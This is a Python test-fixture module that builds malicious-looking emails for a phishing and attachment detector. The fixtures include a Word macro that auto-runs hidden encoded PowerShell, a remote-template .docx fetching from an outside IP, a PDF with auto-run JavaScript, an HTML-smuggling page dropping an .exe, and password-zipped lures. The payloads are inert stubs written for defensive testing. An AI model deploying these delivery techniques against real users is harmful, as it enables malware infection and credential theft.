"""The functional email corpus.

Static ``.eml`` files live in ``tests/fixtures/emails``; the ones whose point
is a binary attachment (a macro document, a PDF with JavaScript, an encrypted
zip, a QR image, an HTML-smuggling page) are built here at test time so the
repository never commits opaque binaries. :func:`all_messages` returns the
whole corpus, static and generated, as ``(name, raw_bytes)``.

Each builder is deterministic and offline. The attachments are the smallest
thing that trips the detector under test, not working malware.
"""

from __future__ import annotations

import base64
import binascii
import io
import struct
import zipfile
import zlib
from email.message import EmailMessage
from email.utils import formatdate
from pathlib import Path

FIXTURES = Path(__file__).resolve().parents[2] / "fixtures" / "emails"

STATIC_FIXTURES = (
    "01_plain_personal",
    "02_newsletter_with_tracking",
    "03_legit_docusign",
    "04_fake_docusign_lookalike",
    "05_bank_alert_display_mismatch",
    "06_bec_wire_change",
    "07_gift_card_ceo",
    "13_yahoo_auth_results",
    "14_icloud_calendar_invite",
    "15_ip_literal_and_shortener",
    "16_magic_link_from_popular_sender",
)


# --------------------------------------------------------------------------- attachment builders


def make_macro_docm() -> bytes:
    """A macro-enabled Word file: an OOXML zip with a vbaProject.bin whose bytes
    contain AutoOpen and a Shell/PowerShell call, plus the macro content-type."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            "</Types>",
        )
        z.writestr(
            "_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/></Relationships>',
        )
        z.writestr(
            "word/_rels/document.xml.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
            'Target="vbaProject.bin"/></Relationships>',
        )
        z.writestr(
            "word/document.xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            "<w:body><w:p><w:r><w:t>Enable editing to view this invoice.</w:t></w:r></w:p></w:body>"
            "</w:document>",
        )
        # Not a real OLE compound file; attachments.py scans the raw bytes of
        # vbaProject.bin for auto-exec and suspicious keywords, which is enough.
        z.writestr(
            "word/vbaProject.bin",
            b"Attribute VB_Name = \"NewMacros\"\r\n"
            b"Sub AutoOpen()\r\n"
            b"    Dim s As Object\r\n"
            b"    Set s = CreateObject(\"WScript.Shell\")\r\n"
            b"    s.Run \"powershell -nop -w hidden -enc SQBFAFgA\"\r\n"
            b"End Sub\r\n"
            b"Sub Document_Open()\r\n    AutoOpen\r\nEnd Sub\r\n",
        )
    return buf.getvalue()


def make_remote_template_docx() -> bytes:
    """A .docx whose settings relationship points a template at an http URL
    (remote template injection)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '<Override PartName="/word/settings.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>'
            "</Types>",
        )
        z.writestr(
            "_rels/.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/></Relationships>',
        )
        z.writestr(
            "word/document.xml",
            '<?xml version="1.0"?><w:document '
            'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            "<w:body><w:p><w:r><w:t>Loading...</w:t></w:r></w:p></w:body></w:document>",
        )
        z.writestr(
            "word/settings.xml",
            '<?xml version="1.0"?><w:settings '
            'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:attachedTemplate '
            'r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
            "</w:settings>",
        )
        z.writestr(
            "word/_rels/settings.xml.rels",
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://185.230.63.107/templates/update.dotm" TargetMode="External"/>'
            "</Relationships>",
        )
    return buf.getvalue()


def make_pdf_with_javascript() -> bytes:
    """A minimal valid PDF with an OpenAction that runs JavaScript."""
    import pymupdf

    doc = pymupdf.open()
    page = doc.new_page()
    page.insert_text((72, 100), "Please wait while this document loads your invoice.")
    js_xref = doc.get_new_xref()
    doc.update_object(
        js_xref,
        "<< /S /JavaScript /JS (app.alert('This document requires Acrobat. "
        "Downloading viewer...'); this.exportDataObject({cName:'x'}); ) >>",
    )
    doc.xref_set_key(doc.pdf_catalog(), "OpenAction", f"{js_xref} 0 R")
    out = doc.tobytes()
    doc.close()
    return out


def make_qr_png(payload: str) -> bytes:
    """A PNG containing a QR code for ``payload`` (generated with qrcode).

    box_size 10 keeps the modules large enough that OpenCV decodes even a long
    URL reliably; a tiny render decodes inconsistently across OpenCV builds.
    The image is rendered as an explicit RGB bitmap (not 1-bit) because some
    OpenCV builds fail to decode a 1-bit-sourced array.
    """
    import qrcode

    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white").convert("RGB")
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def make_html_smuggling() -> bytes:
    """An HTML page that base64-decodes an embedded blob and offers it as a
    download via msSaveOrOpenBlob / createObjectURL."""
    blob = base64.b64encode(b"MZ" + b"\x90\x00" * 1200).decode()
    return (
        "<!doctype html><html><head><meta charset='utf-8'><title>Secure Document</title></head>"
        "<body><p>Your document is being prepared...</p><script>\n"
        f"var data = '{blob}';\n"
        "function b64ToArray(b64) { var bin = atob(b64); var len = bin.length; "
        "var bytes = new Uint8Array(len); for (var i=0;i<len;i++){bytes[i]=bin.charCodeAt(i);} return bytes; }\n"
        "var bytes = b64ToArray(data);\n"
        "var blob = new Blob([bytes], {type: 'application/octet-stream'});\n"
        "var fileName = 'Invoice_2026.exe';\n"
        "if (window.navigator.msSaveOrOpenBlob) { window.navigator.msSaveOrOpenBlob(blob, fileName); }\n"
        "else { var a = document.createElement('a'); a.href = window.URL.createObjectURL(blob); "
        "a.download = fileName; document.body.appendChild(a); a.click(); }\n"
        "</script></body></html>"
    ).encode()


def _crc32_table() -> list[int]:
    table: list[int] = []
    for i in range(256):
        crc = i
        for _ in range(8):
            crc = (crc >> 1) ^ 0xEDB88320 if crc & 1 else crc >> 1
        table.append(crc)
    return table


class _ZipCrypto:
    """Traditional PKWARE (ZipCrypto) stream cipher. Standard library ``zipfile``
    can decrypt this, so a fixture built with it is readable without pyzipper."""

    _TABLE = _crc32_table()

    def __init__(self, pwd: bytes) -> None:
        self.k0, self.k1, self.k2 = 0x12345678, 0x23456789, 0x34567890
        for ch in pwd:
            self._update(ch)

    def _update(self, ch: int) -> None:
        self.k0 = (self.k0 >> 8) ^ self._TABLE[(self.k0 ^ ch) & 0xFF]
        self.k1 = (self.k1 + (self.k0 & 0xFF)) & 0xFFFFFFFF
        self.k1 = (self.k1 * 134775813 + 1) & 0xFFFFFFFF
        self.k2 = (self.k2 >> 8) ^ self._TABLE[(self.k2 ^ (self.k1 >> 24)) & 0xFF]

    def _keystream(self) -> int:
        t = (self.k2 | 2) & 0xFFFF
        return ((t * (t ^ 1)) >> 8) & 0xFF

    def encrypt(self, data: bytes) -> bytes:
        out = bytearray()
        for ch in data:
            out.append(ch ^ self._keystream())
            self._update(ch)
        return bytes(out)


def make_zipcrypto_zip(entries: dict[str, bytes], password: bytes) -> bytes:
    """Build a ZipCrypto-encrypted zip by hand (zipfile cannot *write* encryption).

    The encryption bit is set and the 12-byte check header uses the CRC's high
    byte, exactly as PKWARE specifies, so stdlib ``zipfile`` decrypts it.
    """
    out = io.BytesIO()
    central: list[bytes] = []
    for name, data in entries.items():
        crc = binascii.crc32(data) & 0xFFFFFFFF
        compressor = zlib.compressobj(9, zlib.DEFLATED, -15)
        compressed = compressor.compress(data) + compressor.flush()
        cipher = _ZipCrypto(password)
        header = bytes(range(11)) + bytes([(crc >> 24) & 0xFF])
        payload = cipher.encrypt(header + compressed)
        name_bytes = name.encode()
        flag = 0x1  # bit 0: encrypted
        dos_date = ((2026 - 1980) << 9) | (11 << 5) | 5
        dos_time = 0
        local = struct.pack(
            "<4sHHHHHIIIHH", b"PK\x03\x04", 20, flag, 8, dos_time, dos_date, crc,
            len(payload), len(data), len(name_bytes), 0,
        )
        offset = out.tell()
        out.write(local + name_bytes + payload)
        central.append(
            struct.pack(
                "<4sHHHHHHIIIHHHHHII", b"PK\x01\x02", 20, 20, flag, 8, dos_time, dos_date, crc,
                len(payload), len(data), len(name_bytes), 0, 0, 0, 0, 0, offset,
            )
            + name_bytes
        )
    cd_start = out.tell()
    for entry in central:
        out.write(entry)
    cd_size = out.tell() - cd_start
    out.write(struct.pack("<4sHHHHIIH", b"PK\x05\x06", 0, 0, len(central), len(central), cd_size, cd_start, 0))
    return out.getvalue()


# --------------------------------------------------------------------------- message builders


def _base_message(sender: str, display: str, to: str, subject: str, authserv: str = "mx.google.com") -> EmailMessage:
    msg = EmailMessage()
    msg["From"] = f"{display} <{sender}>"
    msg["To"] = to
    msg["Subject"] = subject
    msg["Date"] = formatdate(1762365600, localtime=False)
    msg["Message-ID"] = f"<{abs(hash(subject)) % 10**12}@{sender.split('@')[-1]}>"
    domain = sender.split("@")[-1]
    msg["Authentication-Results"] = (
        f"{authserv}; dkim=pass header.i=@{domain} header.s=s1; "
        f"spf=pass smtp.mailfrom={sender}; dmarc=pass (p=NONE) header.from={domain}"
    )
    return msg


def build_macro_invoice() -> bytes:
    msg = _base_message("billing@invoices-received.com", "Accounts Payable", "client@gmail.com",
                        "Invoice 2026-4471 attached - please review")
    msg.set_content(
        "Please find the attached invoice. You may need to enable editing to view the details.\n\n"
        "Accounts Payable\n"
    )
    msg.add_attachment(
        make_macro_docm(),
        maintype="application",
        subtype="vnd.ms-word.document.macroEnabled.12",
        filename="Invoice_2026_4471.docm",
    )
    return msg.as_bytes()


def build_pdf_javascript() -> bytes:
    msg = _base_message("documents@secure-fileshare-portal.com", "Document Portal", "client@gmail.com",
                        "A document has been shared with you")
    msg.set_content("A document has been shared with you. Open the attached PDF to view it.\n")
    msg.add_attachment(make_pdf_with_javascript(), maintype="application", subtype="pdf", filename="Shared_Document.pdf")
    return msg.as_bytes()


def build_encrypted_zip() -> bytes:
    msg = _base_message("payments@acme-supplier-invoices.com", "ACME Supplier", "client@gmail.com",
                        "Protected invoice - password inside")
    msg.set_content(
        "Hello,\n\n"
        "Your invoice is attached as a password-protected archive for security.\n"
        "The password is: Invoice2026\n\n"
        "Please open it and process payment by end of day.\n\nACME Supplier Billing\n"
    )
    zip_bytes = make_zipcrypto_zip({"Invoice_2026.exe": b"MZ" + b"\x90\x00" * 400 + b"This program cannot be run in DOS mode."}, b"Invoice2026")
    msg.add_attachment(zip_bytes, maintype="application", subtype="zip", filename="Invoice_protected.zip")
    return msg.as_bytes()


def build_qr_phish() -> bytes:
    msg = _base_message("security@account-verification-center.com", "Account Security", "client@gmail.com",
                        "Scan to re-verify your account")
    msg.set_content(
        "Our records show your account needs re-verification.\n"
        "Scan the QR code in the attached image with your phone to verify.\n"
    )
    msg.add_attachment(
        make_qr_png("https://account-verification-center.com/verify?id=9f8e7d6c5b4a3e2d1c0b9a8f7e6d5c4b"),
        maintype="image",
        subtype="png",
        filename="verify_qr.png",
    )
    return msg.as_bytes()


def build_html_smuggling() -> bytes:
    msg = _base_message("delivery@parcel-tracking-notice.com", "Parcel Tracking", "client@gmail.com",
                        "Your delivery could not be completed")
    msg.set_content("Your parcel could not be delivered. Open the attached document for details and to reschedule.\n")
    msg.add_attachment(make_html_smuggling(), maintype="text", subtype="html", filename="Delivery_Details.html")
    return msg.as_bytes()


GENERATED_BUILDERS = {
    "08_macro_invoice": build_macro_invoice,
    "09_pdf_with_javascript": build_pdf_javascript,
    "10_encrypted_zip_password_in_body": build_encrypted_zip,
    "11_qr_code_phish": build_qr_phish,
    "12_html_smuggling": build_html_smuggling,
}


def static_message(name: str) -> bytes:
    return (FIXTURES / f"{name}.eml").read_bytes()


def all_messages() -> dict[str, bytes]:
    corpus: dict[str, bytes] = {name: static_message(name) for name in STATIC_FIXTURES}
    for name, builder in GENERATED_BUILDERS.items():
        corpus[name] = builder()
    return corpus
